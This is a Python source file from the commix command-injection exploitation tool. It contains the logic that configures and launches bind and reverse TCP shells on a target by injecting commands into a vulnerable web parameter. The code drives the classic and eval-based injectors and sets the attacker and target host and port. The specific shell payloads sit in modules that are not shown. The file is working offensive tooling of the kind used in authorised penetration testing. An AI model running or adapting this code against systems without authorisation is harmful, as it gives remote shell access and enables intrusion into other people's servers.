#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix project (http://commixproject.com).
Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import urllib
import urlparse

from src.utils import menu
from src.utils import settings

from src.core.injections.controller import checks
from src.thirdparty.colorama import Fore, Back, Style, init

from src.core.shells import bind_tcp
from src.core.shells import reverse_tcp
from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.eval_based import eb_injector

"""
Execute the bind / reverse TCP shell
"""
def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option):
  if settings.EVAL_BASED_STATE != False:
    # Command execution results.
    response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Evaluate injection results.
    shell = eb_injector.injection_results(response, TAG, cmd)

  else:
    whitespace = settings.WHITESPACE[0]
    # Command execution results.
    response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
    # Evaluate injection results.
    shell = cb_injector.injection_results(response, TAG, cmd)

  if settings.VERBOSITY_LEVEL >= 1:
    print ""

  err_msg = "The " + os_shell_option.split("_")[0] + " "
  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed!"
  print settings.print_critical_msg(err_msg)

"""
Configure the bind TCP shell
"""
def bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again):
  settings.BIND_TCP = True
  # Set up RHOST / LPORT for the bind TCP connection.
  bind_tcp.configure_bind_tcp()
  if settings.BIND_TCP == False:
    if settings.REVERSE_TCP == True:
      os_shell_option = "reverse_tcp"
      reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
    return go_back, go_back_again

  while True:
    if settings.RHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_bind_tcp_options(settings.RHOST)
    else:  
      cmd = bind_tcp.bind_tcp_options()
      result = checks.check_bind_tcp_options(cmd)
    if result != None:
      if result == 0:
        go_back_again = False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.BIND_TCP = False
      elif result == 3:
        settings.BIND_TCP = False
        reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)  
      return go_back, go_back_again

    # execute bind TCP shell 
    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option)

"""
Configure the reverse TCP shell
"""
def reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again):
  settings.REVERSE_TCP = True
  # Set up LHOST / LPORT for the reverse TCP connection.
  reverse_tcp.configure_reverse_tcp()
  if settings.REVERSE_TCP == False:
    if settings.BIND_TCP == True:
      os_shell_option = "bind_tcp"
      bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
    return go_back, go_back_again

  while True:
    if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
      result = checks.check_reverse_tcp_options(settings.LHOST)
    else:  
      cmd = reverse_tcp.reverse_tcp_options()
      result = checks.check_reverse_tcp_options(cmd)
    if result != None:
      if result == 0:
        go_back_again = False
      elif result == 1 or result == 2:
        go_back_again = True
        settings.REVERSE_TCP = False
      elif result == 3:
        settings.REVERSE_TCP = False
        reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)  
      return go_back, go_back_again

    # execute reverse TCP shell  
    execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option)

"""
Check commix shell options
"""
def check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, delay, go_back_again):
  os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 

  if os_shell_option == "back" or os_shell_option == True or os_shell_option == False:
    go_back = True
    if os_shell_option == False:
      go_back_again = True
    return go_back, go_back_again

  # The "os_shell" option
  elif os_shell_option == "os_shell": 
    warn_msg = "You are already into the '" + os_shell_option + "' mode."
    print settings.print_warning_msg(warn_msg)
    return go_back, go_back_again

  # The "bind_tcp" option
  elif os_shell_option == "bind_tcp":
    go_back, go_back_again = bind_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
    return go_back, go_back_again

  # The "reverse_tcp" option
  elif os_shell_option == "reverse_tcp":
    go_back, go_back_again = reverse_tcp_config(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, os_shell_option, go_back, go_back_again)
    return go_back, go_back_again

  # The "quit" option
  elif os_shell_option == "quit":                    
    sys.exit(0)

  else:
    return go_back, go_back_again
